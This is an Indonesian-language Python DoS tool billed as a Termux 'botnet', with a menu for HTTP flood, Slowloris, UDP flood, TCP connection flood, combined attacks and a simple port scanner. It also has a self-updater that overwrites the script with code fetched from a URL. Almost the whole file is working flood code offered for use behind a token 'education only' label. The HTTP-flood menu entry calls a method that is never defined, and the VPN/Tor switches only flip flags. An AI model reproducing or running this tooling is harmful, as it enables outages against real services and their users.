#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🔥 **VIP+++ BotNet Termux Advanced** 🔥
# 🔰 **Author**: Anonymous
# 🌐 **Version**: 1.0 Ganteng
# ⚠ **Warning**: Buat Edukasi Doang Goblok!

import os
import sys
import time
import random
import socket
import threading
import subprocess
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# ==================== KONFIGURASI ====================
MAX_THREADS = 500
TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]
PROXY_LIST = []
VPN_ENABLED = False
TOR_ENABLED = False
ANONYMOUS_MODE = True
ENCRYPTION_KEY = "X-NexoDev28@@"
UPDATE_URL = "https://raw.githubusercontent.com/example/botnet-termux/main/botnet.py"  # Ganti dengan URL RAW GitHub lu
CURRENT_VERSION = "1.0"

# ==================== SISTEM UPDATE ====================
class UpdateSystem:
    @staticmethod
    def cek_update():
        try:
            TerminalTheme.animate_text("\033[1;33m[+] Lagi cek update nih sabar...\033[0m")
            
            response = requests.get(UPDATE_URL, timeout=10)
            if response.status_code == 200:
                konten_remote = response.text
                
                # Cari versi di file remote
                baris_versi = next(line for line in konten_remote.split('\n') if "Version" in line)
                versi_remote = baris_versi.split(":")[1].strip().strip('"')
                
                if versi_remote != CURRENT_VERSION:
                    TerminalTheme.animate_text(f"\033[1;32m[+] Woi ada update nih bos! (Versi {versi_remote})\033[0m")
                    return True, versi_remote
                else:
                    TerminalTheme.animate_text("\033[1;32m[+] Lu udah pake versi terbaru goblok!\033[0m")
                    return False, None
            else:
                TerminalTheme.animate_text("\033[1;31m[!] Gagal cek update, internet lu lemot kali...\033[0m")
                return False, None
        except Exception as e:
            TerminalTheme.animate_text(f"\033[1;31m[!] Error pas cek update: {str(e)}\033[0m")
            return False, None
    
    @staticmethod
    def update_script():
        try:
            TerminalTheme.animate_text("\033[1;33m[+] Otw update nih jangan close...\033[0m")
            
            response = requests.get(UPDATE_URL, timeout=15)
            if response.status_code == 200:
                with open(__file__, 'w') as f:
                    f.write(response.text)
                
                TerminalTheme.animate_text("\033[1;32m[+] Update berhasil cuk! Restart script nya ya...\033[0m")
                time.sleep(3)
                sys.exit(0)
            else:
                TerminalTheme.animate_text("\033[1;31m[!] Gagal update, coba lagi ntar!\033[0m")
        except Exception as e:
            TerminalTheme.animate_text(f"\033[1;31m[!] Gagal update! Error: {str(e)}\033[0m")

# ==================== ANIMASI & TEMA ====================
class TerminalTheme:
    @staticmethod
    def banner():
        os.system('clear' if os.name == 'posix' else 'cls')
        print(r"""
        
   _____      _   _   _      _____       _   
  |  __ \    | | | \ | |    |  __ \     | |  
  | |__) |___| |_|  \| | ___| |__) |___ | |_ 
  |  _  // _ \ __| . ` |/ _ \  _  // _ \| __|
  | | \ \  __/ |_| |\  |  __/ | \ \ (_) | |_ 
  |_|  \_\___|\__|_| \_|\___|_|  \_\___/ \__|
       
        \033[1;32m⚡ Mode Anonymous: """ + ("Nyala" if ANONYMOUS_MODE else "Mati") + """ 
        \033[1;31mDibuat Sama Anak Jaksel 👻🫦
        \033[0m
        """)

    @staticmethod
    def animate_text(text):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.03)
        print()

    @staticmethod
    def loading_animation():
        chars = "/—\\|"
        for i in range(15):
            sys.stdout.write(f"\r\033[1;34mLoading {chars[i % 4]}\033[0m")
            sys.stdout.flush()
            time.sleep(0.1)

# ==================== TOOLS ====================
class Tools:
    @staticmethod
    def cek_dependencies():
        required = ['requests', 'socks', 'pycryptodome']
        missing = []
        for package in required:
            try:
                __import__(package)
            except ImportError:
                missing.append(package)
        
        if missing:
            print("\033[1;31m[!] Woi ada yang kurang nih, otw install...\033[0m")
            for package in missing:
                subprocess.run(['pip', 'install', package], check=True)
    
    @staticmethod
    def enkripsi_data(data):
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        cipher = AES.new(ENCRYPTION_KEY.encode('utf-8')[:32], AES.MODE_CBC, iv=ENCRYPTION_KEY.encode('utf-8')[:16])
        return cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    
    @staticmethod
    def cek_ip():
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=10)
            return response.json()['ip']
        except:
            return "Gak ketemu"
    
    @staticmethod
    def random_string(length):
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(length))

# ==================== METODE SERANG ====================
class MetodeSerang:
    @staticmethod
    def http_flood(target, port, duration):
        url = f"http://{target}:{port}" if port != 80 else f"http://{target}"
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                requests.get(url, headers=headers, timeout=TIMEOUT)
                requests.post(url, headers=headers, data=Tools.random_string(1024), timeout=TIMEOUT)
            except:
                continue
    
    @staticmethod
    def slowloris(target, port, duration):
        end_time = time.time() + duration
        sockets = []
        
        try:
            for _ in range(200):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(TIMEOUT)
                s.connect((target, port))
                s.send(f"GET /?{Tools.random_string(10)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
                s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n".encode())
                s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
                s.send("Connection: keep-alive\r\n".encode())
                sockets.append(s)
        except:
            pass
        
        while time.time() < end_time:
            for s in sockets:
                try:
                    s.send(f"X-a: {Tools.random_string(1)}\r\n".encode())
                    time.sleep(15)
                except:
                    sockets.remove(s)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(TIMEOUT)
                        s.connect((target, port))
                        sockets.append(s)
                    except:
                        pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    @staticmethod
    def udp_flood(target, port, duration):
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        
        while time.time() < end_time:
            try:
                sock.sendto(bytes, (target, port))
            except:
                pass
    
    @staticmethod
    def tcp_syn_flood(target, port, duration):
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(TIMEOUT)
                s.connect((target, port))
                s.close()
            except:
                pass

# ==================== MENU UTAMA ====================
class BotNetTermux:
    def __init__(self):
        Tools.cek_dependencies()
        self.cek_update_awal()
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;32m[+] Nyalain script BotNet X-Nexo 477...\033[0m")
        TerminalTheme.loading_animation()
        self.tampilkan_menu()
    
    def cek_update_awal(self):
        ada_update, versi_baru = UpdateSystem.cek_update()
        if ada_update:
            pilihan = input(f"\n\033[1;35m[?] Woi ada update nih ({versi_baru}). Mau update sekarang? (y/n): \033[0m").lower()
            if pilihan == 'y':
                UpdateSystem.update_script()
    
    def tampilkan_menu(self):
        while True:
            TerminalTheme.banner()
            print("\033[1;36m[1] Serangan Layer 7 (HTTP Flood)")
            print("[2] Serangan Layer 7 (Slowloris)")
            print("[3] Serangan Layer 4 (UDP Flood)")
            print("[4] Serangan Layer 4 (TCP SYN Flood)")
            print("[5] Serangan Multi-Metode")
            print("[6] Setting Proxy")
            print("[7] Setting VPN/Tor")
            print("[8] Scanner Target")
            print("[9] Cek Update")
            print("[0] Keluar\033[0m")
            
            pilihan = input("\n\033[1;35m[?] Pilih menu: \033[0m")
            
            if pilihan == '1':
                self.layer7_http_flood()
            elif pilihan == '2':
                self.layer7_slowloris()
            elif pilihan == '3':
                self.layer4_udp_flood()
            elif pilihan == '4':
                self.layer4_tcp_syn_flood()
            elif pilihan == '5':
                self.serangan_multi_metode()
            elif pilihan == '6':
                self.setting_proxy()
            elif pilihan == '7':
                self.setting_vpn_tor()
            elif pilihan == '8':
                self.scanner_target()
            elif pilihan == '9':
                self.menu_cek_update()
            elif pilihan == '0':
                TerminalTheme.animate_text("\033[1;31m[!] Keluar dari VIP+++ BotNet Termux Advanced...\033[0m")
                sys.exit()
            else:
                print("\033[1;31m[!] Pilihan ga valid ngentot!\033[0m")
                time.sleep(1)
    
    def menu_cek_update(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Cek update script...\033[0m")
        
        ada_update, versi_baru = UpdateSystem.cek_update()
        if ada_update:
            pilihan = input(f"\n\033[1;35m[?] Woi ada update nih ({versi_baru}). Mau update sekarang? (y/n): \033[0m").lower()
            if pilihan == 'y':
                UpdateSystem.update_script()
        else:
            input("\n\033[1;35m[Enter buat lanjut...]\033[0m")
    
    def layer7_slowloris(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Serangan Layer 7 Slowloris\033[0m")
        
        target = self.dapatkan_target()
        if not target:
            return
        
        try:
            port = int(input("\033[1;35m[?] Masukin port (default 80): \033[0m") or 80)
            duration = int(input("\033[1;35m[?] Masukin durasi serangan (detik): \033[0m"))
            
            TerminalTheme.animate_text(f"\033[1;31m[!] Mulai serangan Slowloris ke {target}:{port} selama {duration} detik...\033[0m")
            
            MetodeSerang.slowloris(target, port, duration)
            
            TerminalTheme.animate_text("\033[1;32m[+] Serangan selesai cuk!\033[0m")
        except ValueError:
            print("\033[1;31m[!] Inputan lu salah goblok!\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {str(e)}\033[0m")
        finally:
            input("\n\033[1;35m[Enter buat lanjut...]\033[0m")
    
    def layer4_udp_flood(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Serangan Layer 4 UDP Flood\033[0m")
        
        target = self.dapatkan_target()
        if not target:
            return
        
        try:
            port = int(input("\033[1;35m[?] Masukin port target: \033[0m"))
            duration = int(input("\033[1;35m[?] Masukin durasi serangan (detik): \033[0m"))
            threads = int(input(f"\033[1;35m[?] Masukin jumlah threads (1-{MAX_THREADS}): \033[0m") or 50)
            
            if threads > MAX_THREADS:
                threads = MAX_THREADS
            
            TerminalTheme.animate_text(f"\033[1;31m[!] Mulai serangan UDP Flood ke {target}:{port} selama {duration} detik pake {threads} threads...\033[0m")
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    executor.submit(MetodeSerang.udp_flood, target, port, duration)
            
            TerminalTheme.animate_text("\033[1;32m[+] Serangan selesai cuk!\033[0m")
        except ValueError:
            print("\033[1;31m[!] Inputan lu salah goblok!\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {str(e)}\033[0m")
        finally:
            input("\n\033[1;35m[Enter buat lanjut...]\033[0m")
    
    def layer4_tcp_syn_flood(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Serangan Layer 4 TCP SYN Flood\033[0m")
        
        target = self.dapatkan_target()
        if not target:
            return
        
        try:
            port = int(input("\033[1;35m[?] Masukin port target: \033[0m"))
            duration = int(input("\033[1;35m[?] Masukin durasi serangan (detik): \033[0m"))
            threads = int(input(f"\033[1;35m[?] Masukin jumlah threads (1-{MAX_THREADS}): \033[0m") or 50)
            
            if threads > MAX_THREADS:
                threads = MAX_THREADS
            
            TerminalTheme.animate_text(f"\033[1;31m[!] Mulai serangan TCP SYN Flood ke {target}:{port} selama {duration} detik pake {threads} threads...\033[0m")
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    executor.submit(MetodeSerang.tcp_syn_flood, target, port, duration)
            
            TerminalTheme.animate_text("\033[1;32m[+] Serangan selesai cuk!\033[0m")
        except ValueError:
            print("\033[1;31m[!] Inputan lu salah goblok!\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {str(e)}\033[0m")
        finally:
            input("\n\033[1;35m[Enter buat lanjut...]\033[0m")
    
    def serangan_multi_metode(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Serangan Multi-Metode\033[0m")
        
        target = self.dapatkan_target()
        if not target:
            return
        
        try:
            port = int(input("\033[1;35m[?] Masukin port target: \033[0m"))
            duration = int(input("\033[1;35m[?] Masukin durasi serangan (detik): \033[0m"))
            threads = int(input(f"\033[1;35m[?] Masukin jumlah threads (1-{MAX_THREADS}): \033[0m") or 50)
            
            if threads > MAX_THREADS:
                threads = MAX_THREADS
            
            TerminalTheme.animate_text(f"\033[1;31m[!] Mulai serangan Multi-Metode ke {target}:{port} selama {duration} detik pake {threads} threads...\033[0m")
            
            methods = [
                MetodeSerang.http_flood,
                MetodeSerang.slowloris,
                MetodeSerang.udp_flood,
                MetodeSerang.tcp_syn_flood
            ]
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    method = random.choice(methods)
                    executor.submit(method, target, port, duration)
            
            TerminalTheme.animate_text("\033[1;32m[+] Serangan selesai cuk!\033[0m")
        except ValueError:
            print("\033[1;31m[!] Inputan lu salah goblok!\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {str(e)}\033[0m")
        finally:
            input("\n\033[1;35m[Enter buat lanjut...]\033[0m")
    
    def setting_proxy(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Setting Proxy\033[0m")
        
        print("\033[1;36mDaftar Proxy Sekarang:\033[0m")
        for i, proxy in enumerate(PROXY_LIST, 1):
            print(f"{i}. {proxy}")
        
        print("\n\033[1;36mPilihan:")
        print("[1] Tambah Proxy")
        print("[2] Hapus Proxy")
        print("[3] Import Daftar Proxy dari File")
        print("[4] Hapus Semua Proxy")
        print("[5] Test Proxy")
        print("[6] Kembali ke Menu Utama\033[0m")
        
        pilihan = input("\n\033[1;35m[?] Pilih menu: \033[0m")
        
        if pilihan == '1':
            proxy = input("\033[1;35m[?] Masukin proxy (ip:port): \033[0m").strip()
            if proxy:
                PROXY_LIST.append(proxy)
                print("\033[1;32m[+] Proxy berhasil ditambah!\033[0m")
            else:
                print("\033[1;31m[!] Proxy ga boleh kosong goblok!\033[0m")
        elif pilihan == '2':
            if not PROXY_LIST:
                print("\033[1;31m[!] Daftar proxy kosong ngentot!\033[0m")
            else:
                try:
                    index = int(input("\033[1;35m[?] Masukin nomor proxy yang mau dihapus: \033[0m")) - 1
                    if 0 <= index < len(PROXY_LIST):
                        removed = PROXY_LIST.pop(index)
                        print(f"\033[1;32m[+] Proxy {removed} berhasil dihapus!\033[0m")
                    else:
                        print("\033[1;31m[!] Nomor proxy ga valid!\033[0m")
                except ValueError:
                    print("\033[1;31m[!] Inputan lu salah goblok!\033[0m")
        elif pilihan == '3':
            file_path = input("\033[1;35m[?] Masukin path file: \033[0m").strip()
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    proxies = f.read().splitlines()
                    PROXY_LIST.extend(proxies)
                    print(f"\033[1;32m[+] {len(proxies)} proxy berhasil diimport!\033[0m")
            else:
                print("\033[1;31m[!] File ga ketemu goblok!\033[0m")
        elif pilihan == '4':
            PROXY_LIST.clear()
            print("\033[1;32m[+] Semua proxy udah dihapus!\033[0m")
        elif pilihan == '5':
            if not PROXY_LIST:
                print("\033[1;31m[!] Daftar proxy kosong ngentot!\033[0m")
            else:
                print("\033[1;33m[+] Lagi test proxy sabar...\033[0m")
                working = []
                for proxy in PROXY_LIST:
                    try:
                        ip, port = proxy.split(':')
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((ip, int(port)))
                        s.close()
                        working.append(proxy)
                        print(f"\033[1;32m[+] {proxy} - Nyala\033[0m")
                    except:
                        print(f"\033[1;31m[!] {proxy} - Mati\033[0m")
                print(f"\n\033[1;36m[+] {len(working)}/{len(PROXY_LIST)} proxy yang nyala\033[0m")
        elif pilihan == '6':
            return
        else:
            print("\033[1;31m[!] Pilihan ga valid ngentot!\033[0m")
        
        input("\n\033[1;35m[Enter buat lanjut...]\033[0m")
    
    def setting_vpn_tor(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Setting VPN/Tor\033[0m")
        
        global VPN_ENABLED, TOR_ENABLED
        
        print("\033[1;36mStatus Sekarang:")
        print(f"VPN: {'Nyala' if VPN_ENABLED else 'Mati'}")
        print(f"Tor: {'Nyala' if TOR_ENABLED else 'Mati'}\033[0m")
        
        print("\n\033[1;36mPilihan:")
        print("[1] Nyalain/Matiin VPN")
        print("[2] Nyalain/Matiin Tor")
        print("[3] Cek Anonimitas")
        print("[4] Kembali ke Menu Utama\033[0m")
        
        pilihan = input("\n\033[1;35m[?] Pilih menu: \033[0m")
        
        if pilihan == '1':
            VPN_ENABLED = not VPN_ENABLED
            status = "nyala" if VPN_ENABLED else "mati"
            print(f"\033[1;32m[+] VPN udah {status}!\033[0m")
        elif pilihan == '2':
            TOR_ENABLED = not TOR_ENABLED
            status = "nyala" if TOR_ENABLED else "mati"
            print(f"\033[1;32m[+] Tor udah {status}!\033[0m")
        elif pilihan == '3':
            print("\033[1;33m[+] Lagi cek anonimitas lu...\033[0m")
            ip_sekarang = Tools.cek_ip()
            print(f"\033[1;36mIP Lu Sekarang: {ip_sekarang}\033[0m")
            
            if VPN_ENABLED or TOR_ENABLED:
                print("\033[1;32m[+] Anonimitas lu aman cuk!\033[0m")
            else:
                print("\033[1;31m[!] WARNING: Gak pake proteksi anonim ngentot!\033[0m")
        elif pilihan == '4':
            return
        else:
            print("\033[1;31m[!] Pilihan ga valid ngentot!\033[0m")
        
        input("\n\033[1;35m[Enter buat lanjut...]\033[0m")
    
    def scanner_target(self):
        TerminalTheme.banner()
        TerminalTheme.animate_text("\033[1;33m[+] Scanner Target\033[0m")
        
        target = input("\033[1;35m[?] Masukin target IP/URL: \033[0m").strip()
        if not target:
            print("\033[1;31m[!] Target ga boleh kosong goblok!\033[0m")
            return
        
        try:
            if not target.replace('.', '').isdigit():
                target_ip = socket.gethostbyname(target)
            else:
                target_ip = target
            
            print(f"\033[1;36m[+] Lagi scan target: {target_ip}\033[0m")
            
            # Simple port scanner
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389, 8080]
            
            print("\033[1;33m[+] Lagi scan port umum...\033[0m")
            open_ports = []
            
            for port in common_ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                result = s.connect_ex((target_ip, port))
                s.close()
                
                if result == 0:
                    open_ports.append(port)
                    print(f"\033[1;32m[+] Port {port} kebuka\033[0m")
                else:
                    print(f"\033[1;31m[!] Port {port} ketutup\033[0m")
            
            if open_ports:
                print(f"\n\033[1;36m[+] Port yang kebuka: {', '.join(map(str, open_ports))}\033[0m")
            else:
                print("\n\033[1;31m[!] Gak ada port yang kebuka goblok!\033[0m")
            
            # Cek target hidup apa kagak
            try:
                response = requests.get(f"http://{target_ip}", timeout=5)
                print(f"\033[1;32m[+] Target masih hidup (HTTP Status: {response.status_code})\033[0m")
            except:
                print("\033[1;31m[!] Gak bisa konek HTTP\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {str(e)}\033[0m")
        finally:
            input("\n\033[1;35m[Enter buat lanjut...]\033[0m")

# ==================== JALANKAN SCRIPT ====================
if __name__ == "__main__":
    try:
        botnet = BotNetTermux()
    except KeyboardInterrupt:
        TerminalTheme.animate_text("\n\033[1;31m[!] Script dihentikan paksa!\033[0m")
        sys.exit()
    except Exception as e:
        print(f"\033[1;31m[!] Error fatal: {str(e)}\033[0m")
        sys.exit(1)